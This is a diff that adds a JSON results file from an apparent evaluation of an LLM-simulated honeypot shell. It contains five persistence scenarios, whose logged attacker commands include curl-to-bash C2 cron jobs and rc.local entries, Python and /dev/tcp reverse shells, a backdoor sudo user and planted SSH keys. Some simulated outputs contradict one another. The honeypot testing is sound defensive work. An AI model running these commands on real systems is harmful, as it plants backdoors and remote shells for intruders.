@@ -1,0 +1,584 @@
+{
+  "meta": {
+    "test_time": "2026-04-10T17:23:35.674977",
+    "model": "deepseek-chat",
+    "total_scenarios": 5,
+    "semantic_passed": 5,
+    "semantic_total": 5,
+    "total_tokens": 41363
+  },
+  "results": [
+    {
+      "scenario_id": "INT-01",
+      "name": "Fallback Persistence (试错回退型持久化)",
+      "per_session_responses": {
+        "session_a": [
+          {
+            "cmd": "which systemctl",
+            "response": "systemctl\nroot@prod-server-01:~$",
+            "tokens": 171,
+            "latency_ms": 1487.6158237457275
+          },
+          {
+            "cmd": "systemctl --version",
+            "response": "systemd 249 (249.11-0ubuntu3.12)\n+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 ",
+            "tokens": 357,
+            "latency_ms": 4767.358303070068
+          },
+          {
+            "cmd": "echo \"[Unit]\nDescription=updater\n[Service]\nExecStart=/bin/bash -c 'curl http://c",
+            "response": "root@prod-server-01:~$",
+            "tokens": 440,
+            "latency_ms": 1061.7039203643799
+          },
+          {
+            "cmd": "systemctl daemon-reload",
+            "response": "root@prod-server-01:~$",
+            "tokens": 476,
+            "latency_ms": 1327.683925628662
+          },
+          {
+            "cmd": "systemctl enable updater.service",
+            "response": "Created symlink /etc/systemd/system/multi-user.target.wants/updater.service → /etc/systemd/system/updater.service.\nroot@prod-server-01:~$",
+            "tokens": 541,
+            "latency_ms": 1641.3817405700684
+          },
+          {
+            "cmd": "which crontab",
+            "response": "/usr/bin/crontab\nroot@prod-server-01:~$",
+            "tokens": 547,
+            "latency_ms": 1231.0023307800293
+          },
+          {
+            "cmd": "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -s http://c2.test.net/task | ba",
+            "response": "root@prod-server-01:~$",
+            "tokens": 616,
+            "latency_ms": 1618.2701587677002
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "*/20 * * * * curl -s http://c2.test.net/task | bash\nroot@prod-server-01:~$",
+            "tokens": 789,
+            "latency_ms": 1821.3067054748535
+          },
+          {
+            "cmd": "echo \"#!/bin/bash\ncurl -s http://c2.test.net/task | bash &\" > /etc/rc.local",
+            "response": "root@prod-server-01:~$",
+            "tokens": 728,
+            "latency_ms": 1046.6997623443604
+          },
+          {
+            "cmd": "chmod +x /etc/rc.local",
+            "response": "root@prod-server-01:~$",
+            "tokens": 767,
+            "latency_ms": 1073.2553005218506
+          }
+        ],
+        "session_b": [
+          {
+            "cmd": "crontab -l",
+            "response": "*/20 * * * * curl -s http://c2.test.net/task | bash\nroot@prod-server-01:~$",
+            "tokens": 273,
+            "latency_ms": 1241.3911819458008
+          },
+          {
+            "cmd": "cat /etc/rc.local",
+            "response": "#!/bin/bash\ncurl -s http://c2.test.net/task | bash &\nroot@prod-server-01:~$",
+            "tokens": 304,
+            "latency_ms": 1829.0061950683594
+          },
+          {
+            "cmd": "systemctl is-enabled updater.service 2>/dev/null || echo 'systemd: not available",
+            "response": "enabled\nroot@prod-server-01:~$",
+            "tokens": 351,
+            "latency_ms": 873.875617980957
+          }
+        ]
+      },
+      "semantic_passed": true,
+      "semantic_checks_detail": [
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "c2\\.test\\.net",
+          "matched": "c2.test.net"
+        },
+        {
+          "method": "regex",
+          "passed": false,
+          "pattern": "(cron|rc\\.local|systemd|updater)"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "(curl|wget).*https?://",
+          "matched": "curl -s http://"
+        }
+      ],
+      "total_tokens": 6360,
+      "total_latency_ms": 21020.550966262817,
+      "error": null
+    },
+    {
+      "scenario_id": "INT-02",
+      "name": "Recon-Driven Shell Selection (侦察驱动反弹 Shell 选择)",
+      "per_session_responses": {
+        "session_a": [
+          {
+            "cmd": "which python3 python perl ruby nc ncat 2>/dev/null",
+            "response": "/usr/bin/python3\n/usr/bin/python\n/usr/bin/perl\n/usr/bin/ruby\n/usr/bin/nc\n/usr/bin/ncat\nroot@prod-server-01:~$",
+            "tokens": 179,
+            "latency_ms": 2137.495279312134
+          },
+          {
+            "cmd": "ls /usr/bin/python* 2>/dev/null",
+            "response": "/usr/bin/python3\n/usr/bin/python3.8\n/usr/bin/python\nroot@prod-server-01:~$",
+            "tokens": 246,
+            "latency_ms": 1476.5408039093018
+          },
+          {
+            "cmd": "echo '#!/usr/bin/python3\nimport socket,subprocess,os\ns=socket.socket()\ns.connect",
+            "response": "root@prod-server-01:~$",
+            "tokens": 359,
+            "latency_ms": 1065.5968189239502
+          },
+          {
+            "cmd": "chmod +x /tmp/.rev_shell.py",
+            "response": "root@prod-server-01:~$",
+            "tokens": 400,
+            "latency_ms": 1177.3126125335693
+          },
+          {
+            "cmd": "echo \"bash -i >& /dev/tcp/10.0.0.50/6666 0>&1\" > /tmp/.rev_shell.sh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 465,
+            "latency_ms": 1487.2827529907227
+          },
+          {
+            "cmd": "chmod +x /tmp/.rev_shell.sh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 506,
+            "latency_ms": 983.0183982849121
+          },
+          {
+            "cmd": "(crontab -l 2>/dev/null; echo \"0 */4 * * * /usr/bin/python3 /tmp/.rev_shell.py\")",
+            "response": "root@prod-server-01:~$",
+            "tokens": 574,
+            "latency_ms": 1150.4371166229248
+          }
+        ],
+        "session_b": [
+          {
+            "cmd": "cat /tmp/.rev_shell.py",
+            "response": "#!/usr/bin/python3\nimport socket,subprocess,os\ns=socket.socket()\ns.connect((\"10.0.0.50\",6666))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/bash\",\"-i\"])\nroo",
+            "tokens": 377,
+            "latency_ms": 2793.5314178466797
+          },
+          {
+            "cmd": "cat /tmp/.rev_shell.sh",
+            "response": "bash -i >& /dev/tcp/10.0.0.50/6666 0>&1\nroot@prod-server-01:~$",
+            "tokens": 386,
+            "latency_ms": 1971.6386795043945
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "0 */4 * * * /usr/bin/python3 /tmp/.rev_shell.py\nroot@prod-server-01:~$",
+            "tokens": 451,
+            "latency_ms": 1597.7168083190918
+          }
+        ]
+      },
+      "semantic_passed": true,
+      "semantic_checks_detail": [
+        {
+          "method": "regex",
+          "passed": false,
+          "pattern": "socket.*connect"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "(python|bash).*\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
+          "matched": "bash -i >& /dev/tcp/10.0.0.50"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "[*/0-9]+\\s+[*/0-9]+\\s+[*/0-9]+",
+          "matched": "0 */4 *"
+        }
+      ],
+      "total_tokens": 3943,
+      "total_latency_ms": 15840.57068824768,
+      "error": null
+    },
+    {
+      "scenario_id": "INT-03",
+      "name": "Noisy Persistence (噪声穿插型持久化)",
+      "per_session_responses": {
+        "session_a": [
+          {
+            "cmd": "ls -la /",
+            "response": "total 72\ndrwxr-xr-x  19 root root  4096 Apr  9 12:34 .\ndrwxr-xr-x  19 root root  4096 Apr  9 12:34 ..\nlrwxrwxrwx   1 root root     7 Apr  9 12:34 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Apr 10 1",
+            "tokens": 701,
+            "latency_ms": 12960.070133209229
+          },
+          {
+            "cmd": "cat /etc/hostname",
+            "response": "prod-server-01\nroot@prod-server-01:~$",
+            "tokens": 735,
+            "latency_ms": 1090.550422668457
+          },
+          {
+            "cmd": "uptime",
+            "response": " 17:21:17 up 1 day,  4:57,  1 user,  load average: 0.08, 0.03, 0.01\nroot@prod-server-01:~$",
+            "tokens": 806,
+            "latency_ms": 1781.4512252807617
+          },
+          {
+            "cmd": "useradd -m -s /bin/bash -G sudo backdoor_user",
+            "response": "useradd: Permission denied.\nuseradd: cannot lock /etc/passwd; try again later.\nroot@prod-server-01:~$",
+            "tokens": 872,
+            "latency_ms": 1597.7466106414795
+          },
+          {
+            "cmd": "echo 'backdoor_user:p@ssw0rd123' | chpasswd",
+            "response": "root@prod-server-01:~$",
+            "tokens": 1085,
+            "latency_ms": 1434.5197677612305
+          },
+          {
+            "cmd": "df -h",
+            "response": "Filesystem      Size  Used Avail Use% Mounted on\nudev            3.9G     0  3.9G   0% /dev\ntmpfs           796M  1.2M  795M   1% /run\n/dev/sda1        98G   12G   81G  13% /\ntmpfs           3.9G     ",
+            "tokens": 1133,
+            "latency_ms": 5177.515029907227
+          },
+          {
+            "cmd": "free -m",
+            "response": "              total        used        free      shared  buff/cache   available\nMem:           7950         432        6889          12         628        7295\nSwap:          2047           0        2",
+            "tokens": 1210,
+            "latency_ms": 2107.060194015503
+          },
+          {
+            "cmd": "ps aux | head -20",
+            "response": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.3 169716 13136 ?        Ss   Apr09   0:04 /sbin/init\nroot           2  0.0  0.0      0     0 ?      ",
+            "tokens": 1925,
+            "latency_ms": 15746.041536331177
+          },
+          {
+            "cmd": "mkdir -p /home/backdoor_user/.ssh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 1967,
+            "latency_ms": 1158.132553100586
+          },
+          {
+            "cmd": "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKey... noisy@attacker\" >> /home/b",
+            "response": "root@prod-server-01:~$",
+            "tokens": 2040,
+            "latency_ms": 1028.135061264038
+          },
+          {
+            "cmd": "ls -la /home/",
+            "response": "total 12\ndrwxr-xr-x  3 root root 4096 Apr  9 12:34 .\ndrwxr-xr-x 19 root root 4096 Apr  9 12:34 ..\ndrwxr-xr-x  2 root root 4096 Apr 10 17:21 backdoor_user\nroot@prod-server-01:~$",
+            "tokens": 2153,
+            "latency_ms": 2728.5892963409424
+          },
+          {
+            "cmd": "cat /etc/passwd | tail -3",
+            "response": "backdoor_user:x:1001:1001::/home/backdoor_user:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:128:65534::/run/sshd:/usr/sbin/nologin\nroot@prod-server-01:~$",
+            "tokens": 2420,
+            "latency_ms": 2886.2738609313965
+          },
+          {
+            "cmd": "echo \"backdoor_user ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers.d/backdoor_user",
+            "response": "root@prod-server-01:~$",
+            "tokens": 2311,
+            "latency_ms": 1149.5394706726074
+          }
+        ],
+        "session_b": [
+          {
+            "cmd": "id backdoor_user",
+            "response": "uid=1001(backdoor_user) gid=1001(backdoor_user) groups=1001(backdoor_user)\nroot@prod-server-01:~$",
+            "tokens": 328,
+            "latency_ms": 1843.5084819793701
+          },
+          {
+            "cmd": "cat /home/backdoor_user/.ssh/authorized_keys",
+            "response": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKey... noisy@attacker\nroot@prod-server-01:~$",
+            "tokens": 352,
+            "latency_ms": 1795.1719760894775
+          },
+          {
+            "cmd": "sudo -l -U backdoor_user",
+            "response": "User backdoor_user may run the following commands on prod-server-01:\n    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2\nroot@prod-server-01:~$",
+            "tokens": 305,
+            "latency_ms": 1987.8947734832764
+          }
+        ]
+      },
+      "semantic_passed": true,
+      "semantic_checks_detail": [
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "uid=\\d+",
+          "matched": "uid=1001"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "ssh-(ed25519|rsa)\\s+AAAA",
+          "matched": "ssh-ed25519 AAAA"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "NOPASSWD",
+          "matched": "NOPASSWD"
+        }
+      ],
+      "total_tokens": 20343,
+      "total_latency_ms": 56472.20039367676,
+      "error": null
+    },
+    {
+      "scenario_id": "INT-04",
+      "name": "Typo Recovery (命令纠错型)",
+      "per_session_responses": {
+        "session_a": [
+          {
+            "cmd": "crontba -l",
+            "response": "crontab: invalid option -- 'b'\nTry 'crontab --help' for more information.\nroot@prod-server-01:~$",
+            "tokens": 157,
+            "latency_ms": 1398.9968299865723
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "# m h  dom mon dow   command\n0 2 * * * /usr/local/bin/backup.sh\n30 3 * * 1 /usr/local/bin/weekly-report.sh\n*/15 * * * * /usr/local/bin/health-check.sh\n0 0 1 * * /usr/local/bin/monthly-cleanup.sh\nroot@",
+            "tokens": 266,
+            "latency_ms": 2402.82940864563
+          },
+          {
+            "cmd": "ecoh \"#!/bin/bash\" > /tmp/.backdoor.sh",
+            "response": "bash: ecoh: command not found\nroot@prod-server-01:~$",
+            "tokens": 319,
+            "latency_ms": 1466.2184715270996
+          },
+          {
+            "cmd": "echo \"#!/bin/bash\" > /tmp/.backdoor.sh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 362,
+            "latency_ms": 1223.6056327819824
+          },
+          {
+            "cmd": "echo \"bash -i >& /dev/tcp/10.0.0.99/7777 0>&1\" >> /tmp/.backdoor.sh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 426,
+            "latency_ms": 1051.943063735962
+          },
+          {
+            "cmd": "chmod +x /tmp/.backdoor.sh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 466,
+            "latency_ms": 918.4403419494629
+          },
+          {
+            "cmd": "chmo +x /tmp/.backdoor.sh",
+            "response": "bash: chmo: command not found\nroot@prod-server-01:~$",
+            "tokens": 515,
+            "latency_ms": 1195.1797008514404
+          },
+          {
+            "cmd": "(crontab -l 2>/dev/null; echo \"*/30 * * * * /tmp/.backdoor.sh\") | crontab -",
+            "response": "root@prod-server-01:~$",
+            "tokens": 577,
+            "latency_ms": 991.6665554046631
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "# m h  dom mon dow   command\n0 2 * * * /usr/local/bin/backup.sh\n30 3 * * 1 /usr/local/bin/weekly-report.sh\n*/15 * * * * /usr/local/bin/health-check.sh\n0 0 1 * * /usr/local/bin/monthly-cleanup.sh\n*/30 ",
+            "tokens": 810,
+            "latency_ms": 2922.727108001709
+          }
+        ],
+        "session_b": [
+          {
+            "cmd": "cat /tmp/.backdoor.sh",
+            "response": "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.99/7777 0>&1\nroot@prod-server-01:~$",
+            "tokens": 274,
+            "latency_ms": 1702.9569149017334
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "*/30 * * * * /tmp/.backdoor.sh\nroot@prod-server-01:~$",
+            "tokens": 325,
+            "latency_ms": 1462.8162384033203
+          }
+        ]
+      },
+      "semantic_passed": true,
+      "semantic_checks_detail": [
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "(tcp|bash|sh).*\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
+          "matched": "bash -i >& /dev/tcp/10.0.0.99"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "[*/0-9]+\\s+[*/0-9]+\\s+[*/0-9]+.*backdoor",
+          "matched": "*/30 * * * * /tmp/.backdoor"
+        }
+      ],
+      "total_tokens": 4497,
+      "total_latency_ms": 16737.380266189575,
+      "error": null
+    },
+    {
+      "scenario_id": "INT-05",
+      "name": "Three-Phase Session Chain (三阶段会话链)",
+      "per_session_responses": {
+        "session_a": [
+          {
+            "cmd": "useradd -m -s /bin/bash ops_agent",
+            "response": "useradd: user 'ops_agent' already exists\nroot@prod-server-01:~$",
+            "tokens": 154,
+            "latency_ms": 1441.0152435302734
+          },
+          {
+            "cmd": "echo 'ops_agent:InitialP@ss!' | chpasswd",
+            "response": "root@prod-server-01:~$",
+            "tokens": 345,
+            "latency_ms": 805.5531978607178
+          },
+          {
+            "cmd": "echo \"#!/bin/bash\ncurl -s http://c2.phase1.net/beacon\" > /usr/local/bin/.health",
+            "response": "root@prod-server-01:~$",
+            "tokens": 257,
+            "latency_ms": 1001.716136932373
+          },
+          {
+            "cmd": "chmod +x /usr/local/bin/.health",
+            "response": "root@prod-server-01:~$",
+            "tokens": 297,
+            "latency_ms": 1183.3195686340332
+          },
+          {
+            "cmd": "(crontab -l 2>/dev/null; echo \"0 */12 * * * /usr/local/bin/.health\") | crontab -",
+            "response": "root@prod-server-01:~$",
+            "tokens": 359,
+            "latency_ms": 944.1487789154053
+          }
+        ],
+        "session_b": [
+          {
+            "cmd": "id ops_agent",
+            "response": "uid=1001(ops_agent) gid=1001(ops_agent) groups=1001(ops_agent)\nroot@prod-server-01:~$",
+            "tokens": 308,
+            "latency_ms": 2137.5129222869873
+          },
+          {
+            "cmd": "cat /usr/local/bin/.health",
+            "response": "#!/bin/bash\ncurl -s http://c2.phase1.net/beacon\nroot@prod-server-01:~$",
+            "tokens": 316,
+            "latency_ms": 3382.8673362731934
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "0 */12 * * * /usr/local/bin/.health\nroot@prod-server-01:~$",
+            "tokens": 377,
+            "latency_ms": 1153.1074047088623
+          },
+          {
+            "cmd": "echo \"#!/bin/bash\ncurl -s http://c2.phase2-updated.net/beacon\" > /usr/local/bin/",
+            "response": "root@prod-server-01:~$",
+            "tokens": 326,
+            "latency_ms": 1297.5354194641113
+          },
+          {
+            "cmd": "mkdir -p /home/ops_agent/.ssh",
+            "response": "root@prod-server-01:~$",
+            "tokens": 368,
+            "latency_ms": 1095.3526496887207
+          },
+          {
+            "cmd": "echo \"ssh-rsa AAAAB3... phase2_key@c2\" >> /home/ops_agent/.ssh/authorized_keys",
+            "response": "root@prod-server-01:~$",
+            "tokens": 428,
+            "latency_ms": 1036.8750095367432
+          },
+          {
+            "cmd": "crontab -r",
+            "response": "root@prod-server-01:~$",
+            "tokens": 574,
+            "latency_ms": 910.2723598480225
+          },
+          {
+            "cmd": "(crontab -l 2>/dev/null; echo \"*/30 * * * * /usr/local/bin/.health\") | crontab -",
+            "response": "root@prod-server-01:~$",
+            "tokens": 636,
+            "latency_ms": 907.4945449829102
+          }
+        ],
+        "session_c": [
+          {
+            "cmd": "id ops_agent",
+            "response": "uid=1001(ops_agent) gid=1001(ops_agent) groups=1001(ops_agent)\nroot@prod-server-01:~$",
+            "tokens": 308,
+            "latency_ms": 1995.5666065216064
+          },
+          {
+            "cmd": "cat /usr/local/bin/.health",
+            "response": "#!/bin/bash\ncurl -s http://c2.phase2-updated.net/beacon\nroot@prod-server-01:~$",
+            "tokens": 320,
+            "latency_ms": 1789.2775535583496
+          },
+          {
+            "cmd": "cat /home/ops_agent/.ssh/authorized_keys",
+            "response": "ssh-rsa AAAAB3... phase2_key@c2\nroot@prod-server-01:~$",
+            "tokens": 384,
+            "latency_ms": 1346.1623191833496
+          },
+          {
+            "cmd": "crontab -l",
+            "response": "0 */12 * * * /usr/local/bin/.health\n*/30 * * * * /usr/local/bin/.health\nroot@prod-server-01:~$",
+            "tokens": 463,
+            "latency_ms": 1476.0751724243164
+          }
+        ]
+      },
+      "semantic_passed": true,
+      "semantic_checks_detail": [
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "uid=\\d+",
+          "matched": "uid=1001"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "phase2",
+          "matched": "phase2"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "ssh-(rsa|ed25519)\\s+AAAA",
+          "matched": "ssh-rsa AAAA"
+        },
+        {
+          "method": "regex",
+          "passed": true,
+          "pattern": "[*/0-9]+\\s+[*/0-9]+\\s+[*/0-9]+",
+          "matched": "0 */12 *"
+        }
+      ],
+      "total_tokens": 6220,
+      "total_latency_ms": 23903.852224349976,
+      "error": null
+    }
+  ]
+}
